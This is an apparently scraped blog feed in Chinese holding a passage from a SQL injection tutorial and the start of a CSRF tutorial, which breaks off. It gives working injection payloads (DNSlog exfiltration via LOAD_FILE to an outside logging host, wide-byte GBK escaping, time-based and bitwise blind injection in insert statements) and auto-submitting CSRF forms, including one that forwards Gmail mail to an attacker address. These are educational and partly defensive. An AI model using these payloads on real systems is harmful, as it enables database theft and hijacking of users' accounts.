class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。UNC命名被应用于在局域网中访问文件服务器或者打印机，Windows系统的UNC语法具有通用的形式：  \\ComputerName\SharedFolder\Resource</span><br><span class="line"></span><br><span class="line">攻击者能够通过使用自定义制作的地址作为计算机名字段的值引发DNS请求。</span><br></pre></td></tr></table></figure><p>  条件：</p><p>  1、secure_file_priv为空</p><p>  2、目标系统是windows，能够使用UNC路径</p><p>  实例：</p><p>  构造sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(select database(),&#39;mysql.cmr1ua.ceye.io\\abc&#39;)))</span><br></pre></td></tr></table></figure><p>四个\，其中两个用来转义。<br>DNSlog平台接受信息<br><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200911100714531.png" alt="image-20200911100714531"></p></li></ul><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>造成宽字节注入的原因是编码转换，应用程序的编码与数据库的编码不一致，编码转换导致的引号逃逸。</p><p>GBK双字节编码：一个汉字用两个字节表示，首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F），刚好涵盖了对应的编码0x5C。</p><p>比如客户端php的编码为UTF-8，而mysql通过set name ‘GBK’设置编码，导致两者的编码不一样，在进行编码转换的时候出现了宽字节注入。</p><p>应用程序的编码</p><p>以php为例子，使用者输入数据后，会通过php的默认编码生成sql语句发送给服务器。在php没有开启<code>default_charset</code>编码时，php的默认编码为空，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; PHP&#39;s built-in default is text&#x2F;html</span><br><span class="line">default_mimetype &#x3D; &quot;text&#x2F;html&quot;</span><br><span class="line">;default_charset &#x3D; &quot;iso-8859-1&quot;</span><br></pre></td></tr></table></figure><p>此时php会根据数据库中的编码自动来确定使用那种编码，可以使用<code>&lt;?php $m=&quot;字&quot;; echo strlen($m);?&gt;</code> 来进行判断，如果输出的值是3说明是<code>utf-8</code>编码。如果输出的值是2说明是<code>gbk</code>编码；</p><p><code>SET NAMES &#39;GBK&#39;</code>语句与这三个语句等价：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;&#39;GBK&#39;;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;&#39;GBK&#39;;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;&#39;GBK&#39;;</span><br></pre></td></tr></table></figure><p>三个语句的作用是：</p><p>当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。</p><p>当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p><p>使用<code>addslashes</code>函数或是开启<code>PHPGPC</code>（注：<code>在php5.4已上已给删除</code>，并且需要说明特别说明一点，GPC无法过滤<code>$_SERVER</code>提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，我们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单引号（&#39;）&#x3D; （\&#39;）</span><br><span class="line">双引号（&quot;） &#x3D; （\&quot;）</span><br><span class="line">反斜杠（\） &#x3D; （\\）</span><br></pre></td></tr></table></figure><p>比如我们输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;%df%27</span><br></pre></td></tr></table></figure><p>会被进行如下转换</p><p>%df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運’ </p><p>因为数据库设置了<code>GBK</code>编马，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。即是<code>%df%5c</code>转换成了汉字<code>運</code>，而单引号就逃逸了出来，从而造成了注入漏洞。</p><p>防御：</p><p>对于宽字节编码，有一种最好的修补就是：</p><p>（1）使用mysql_set_charset(GBK)指定字符集</p><p>（2）使用mysql_real_escape_string进行转义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面%df和5c拼接为一个宽字节的问题，就是使用mysql_set_charset进行指定，他会指定当前连接的字符集。</span><br></pre></td></tr></table></figure><p>（3）character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p><h4 id="PDO技术"><a href="#PDO技术" class="headerlink" title="PDO技术"></a>PDO技术</h4><p>mysql的预编译</p><p>当采用预编译操作时，首先将待执行的SQL，语句中的参数值用占位符替代。当带着占位符的SQL<br>语句模板被数据库编译、解析后，再通过向占位符绑定参数进行查询操作。</p><p>模拟预处理</p><p>模拟预编译是防止某些数据库不支持预编译而设置的(如sqllite与低版本mysql)。如果模拟预处理开启，那么客户端程序内部会模拟mysql数据库中的参数绑定这一过程。也就是说，程序会在内部模拟prepare的过程，当执行execute时，再将拼接后的完整SQL语句发送给mysql数据库执行</p><p>模拟预处理并没有实现SQL模板与参数的分离，但的确可以防止sql注入。模拟预处理防止sql注入的本质是在参数绑定过程中对参数值进行转义与过滤,这一点与真正的sql数据库预处理是不一样的。理论上，sql数据库预编译更加安全一些。</p><p>非模拟预处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PDO::ATTR_EMULATE_PREPARES =&gt; <span class="literal">false</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$params = [</span><br><span class="line">    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,</span><br><span class="line">    PDO::ATTR_EMULATE_PREPARES  =&gt; <span class="literal">false</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:dbname=cat;host=127.0.0.1;&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, $params);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $link = $db-&gt;prepare(<span class="string">&#x27;SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (\PDOException $e) &#123;</span><br><span class="line">    var_dump($e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里使用非模拟预编，非模拟预编译不会像模拟预编呢样在PDO内部会模拟参数绑定的过程，</p><p>非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。</p><p>在发送带有占位符的sql语句到数据库的时候这时候就已经发生了错误。进行了报错。</p><p>预编译可以完全杜绝注入攻击吗</p><p>在预编译阶段即prepare阶段，sql语句的模板中参数名可控，导致的sql注入。</p><p>总结</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、使用PDO时尽量使用非模拟预处理。</span><br><span class="line">2、创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false，禁止多语句查询。</span><br><span class="line">3、SQL语句模板不使用变量动态拼接生成</span><br></pre></td></tr></table></figure><p>关于orderby不能参数化查询的问题</p><p>原因：</p><ul><li><p>order by后面拼接字段名，字段名不能加引号。</p></li><li><p>在进行预编译的时候，我们替换占位符的时候字段串会自动加上引号，比如java的setString方法。</p></li></ul><h5 id="insert、update注入"><a href="#insert、update注入" class="headerlink" title="insert、update注入"></a>insert、update注入</h5><h6 id="利用报错注入"><a href="#利用报错注入" class="headerlink" title="利用报错注入"></a>利用报错注入</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into steady(p_name,p_number,p_owner,p_ney,sqdate) values( &#39;te1st&#39;,&#39;51&#39;,&#39;Olivia&#39; or 注入语句</span><br><span class="line"> or&#39;&#39;,&#39;test123&#39;,&#39;1511241494&#39;) -- </span><br></pre></td></tr></table></figure><h6 id="无回显注入-盲注"><a href="#无回显注入-盲注" class="headerlink" title="无回显注入(盲注)"></a>无回显注入(盲注)</h6><ul><li><p>利用xor、||、&amp;&amp;、+,-,*,/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (sleep(10));</span><br><span class="line">+-------------+</span><br><span class="line">| (sleep(10)) |</span><br><span class="line">+-------------+</span><br><span class="line">|           0 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (10.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into steady values (0 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (0 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (0 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.09 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.01 sec)</span><br></pre></td></tr></table></figure><p>配合if、substr等函数进行盲注。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into  math values(0 || if(substr(user(),1,1)&#x3D;&#39;r&#39;,sleep(0),sleep(10)),&#39;444&#39;);</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into  math values(0 || if(substr(user(),1,1)&#x3D;&#39;b&#39;,sleep(0),sleep(10)),&#39;444&#39;);</span><br><span class="line">Query OK, 1 row affected (10.00 sec)</span><br></pre></td></tr></table></figure></li></ul><h6 id="有回显注入-符号"><a href="#有回显注入-符号" class="headerlink" title="有回显注入(符号)"></a>有回显注入(符号)</h6><ul><li><p>实例：</p><p>按位或、按位异或受收到字段类型的限制，比如一下表中的id字段，id字段只允许10个长度，我们想要的数据有时候超过10个长度。</p><p>这时候我们需要使用substr函数去截取制定的字段，然后在使用hex。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#int型按位或</span><br><span class="line">mysql&gt; insert into steady values (0 | (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from steady;</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| userid   | username | signature | mood |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| 74657374 | 0        | test      | 0    |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(74657374);</span><br><span class="line">+-----------------+</span><br><span class="line">| unhex(74657374) |</span><br><span class="line">+-----------------+</span><br><span class="line">| test            |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">#int型按位异或</span><br><span class="line">mysql&gt; insert into ctf values (100 ^ (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| userid   | username | signature | mood |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| 74657338 | 0        | test      | 0    |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(100^74657338);</span><br><span class="line">+---------------------+</span><br><span class="line">| unhex(100^74657338) |</span><br><span class="line">+---------------------+</span><br><span class="line">| test                |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#字符型按位或</span><br><span class="line">mysql&gt; insert into ctf values (100 ,&#39;0&#39;| (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">|    100 | 74657374 | test      | 0    |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(74657374);</span><br><span class="line">+-----------------+</span><br><span class="line">| unhex(74657374) |</span><br><span class="line">+-----------------+</span><br><span class="line">| test            |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#字符型按位异或</span><br><span class="line">mysql&gt; insert into ctf values (100 ,&#39;100&#39; ^ (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">|    100 | 74657338 | test      | 0    |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select unhex(&#39;100&#39;^74657338);</span><br><span class="line">+-----------------------+</span><br><span class="line">| unhex(&#39;100&#39;^74657338) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| test                  |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>mysql运算符</p><ul><li><p>按位或运算符–｜</p><p>0与任意的数字b或都为b</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; mysql&gt; select (0|1);</span><br><span class="line">+-------+</span><br><span class="line">| (0|1) |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0|2323);</span><br><span class="line">+----------+</span><br><span class="line">| (0|2323) |</span><br><span class="line">+----------+</span><br><span class="line">|     2323 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0|452323);</span><br><span class="line">+------------+</span><br><span class="line">| (0|452323) |</span><br><span class="line">+------------+</span><br><span class="line">|     452323 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>按位异或运算符–^</p><ul><li><p>0与任意的数字b异或都是b</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (0^452323);</span><br><span class="line">+------------+</span><br><span class="line">| (0^452323) |</span><br><span class="line">+------------+</span><br><span class="line">|     452323 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0^5644);</span><br><span class="line">+----------+</span><br><span class="line">| (0^5644) |</span><br><span class="line">+----------+</span><br><span class="line">|     5644 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>其他数字a与任意数字b异或得到c</p><p>可以通过c与a异或得到b，通常b是我们sql注入想要的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (10^5644);</span><br><span class="line">+-----------+</span><br><span class="line">| (10^5644) |</span><br><span class="line">+-----------+</span><br><span class="line">|      5638 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (10^5638);</span><br><span class="line">+-----------+</span><br><span class="line">| (10^5638) |</span><br><span class="line">+-----------+</span><br><span class="line">|      5644 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><p>1、mysql的网站注入，5.0以上和5.0以下有什么区别？</p><p>MySQL 5.0以上版本， 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p><p> 5.0以下是多用户单操作，5.0以上是多用户多操做。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h4&gt;&lt;p&gt;用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当</summary>
      
    
    
    
    <category term="SQL注入" scheme="http://s1eady.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="OWSP-TOP10" scheme="http://s1eady.top/tags/OWSP-TOP10/"/>
    
  </entry>
  
  <entry>
    <title>CSRF漏洞</title>
    <link href="http://s1eady.top/2019/06/22/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://s1eady.top/2019/06/22/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2019-06-22T01:20:56.000Z</published>
    <updated>2020-10-07T02:21:00.314Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CSRF漏洞总结"><a href="#CSRF漏洞总结" class="headerlink" title="CSRF漏洞总结"></a>CSRF漏洞总结</h3><h4 id="Gmail的CSRF漏洞"><a href="#Gmail的CSRF漏洞" class="headerlink" title="Gmail的CSRF漏洞"></a>Gmail的CSRF漏洞</h4><p>黑客诱惑受害者点击藏有恶意代码的空白页面</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt; </span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;cf2_emc&quot;</span> value=<span class="string">&quot;true&quot;</span>/&gt; </span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;cf2_email&quot;</span> value=<span class="string">&quot;hacker@hakermail.com&quot;</span>/&gt; </span><br><span class="line">    .....</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;irf&quot;</span> value=<span class="string">&quot;on&quot;</span>/&gt; </span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;nvp_bu_cftb&quot;</span> value=<span class="string">&quot;Create Filter&quot;</span>/&gt; </span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;script&gt; </span><br><span class="line">    document.forms[<span class="number">0</span>].submit();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了”Create Filter”命令，将所有的邮件，转发到”<a href="mailto:&#x68;&#97;&#99;&#107;&#x65;&#x72;&#x40;&#x68;&#97;&#x6b;&#x65;&#x72;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">&#x68;&#97;&#99;&#107;&#x65;&#x72;&#x40;&#x68;&#97;&#x6b;&#x65;&#x72;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;</a>“。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p><ul><li><p>受害者登录a.com，并保留了登录凭证（Cookie）。</p></li><li><p>攻击者引诱受害者访问了b.com。</p></li><li><p>b.com伪装受害者的身份向c.com 发送了一个请求。</p></li><li><p>c.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</p></li><li><p>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让c.com执行了自己定义的操作。</p></li></ul><h4 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h4><h5 id="GET类型的CSRF"><a href="#GET类型的CSRF" class="headerlink" title="GET类型的CSRF"></a>GET类型的CSRF</h5><p>只需要一个HTTP请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;bank.example&#x2F;withdraw?amount&#x3D;10000&amp;for&#x3D;hacker&quot; &gt; </span><br></pre></td></tr></table></figure><p>在受害者访问含有这个img的页面后，浏览器会自动向<code>http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker</code>发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。</p><h5 id="POST类型的CSRF"><a href="#POST类型的CSRF" class="headerlink" title="POST类型的CSRF"></a>POST类型的CSRF</h5><p>使用的是一个自动提交的表单</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;form action=<span class="string">&quot;http://bank.example/withdraw&quot;</span> method=POST&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;account&quot;</span> value=<span class="string">&quot;xiaoming&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;amount&quot;</span> value=<span class="string">&quot;10000&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;for&quot;</span> value=<span class="string">&quot;hacker&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </span><br></pre></td></tr></table></figure><p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。以上两个类型不需要用户去操作，会在用户不知情的情况下自动提交请求。</p><h5 id="链接类型的CSRF"><a href="#链接类型的CSRF" class="headerlink" title="链接类型的CSRF"></a>链接类型的CSRF</h5><p>此类CSRF需要用户交互，必须用户有意识到去点击恶意连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;test.com&#x2F;csrf&#x2F;withdraw.php?amount&#x3D;1000&amp;for&#x3D;hacker&quot; taget&#x3D;&quot;_blank&quot;&gt;领取200红包&lt;a&#x2F;&gt;</span><br></pre></td></tr></table></figure><h4 id="漏洞特点"><a href="#漏洞特点" class="headerlink" title="漏洞特点"></a>漏洞特点</h4><ul><li>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</li><li>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。</li><li>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</li><li>跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。</li></ul><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>1、无需任何验证即可删除某社区的帖子</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span 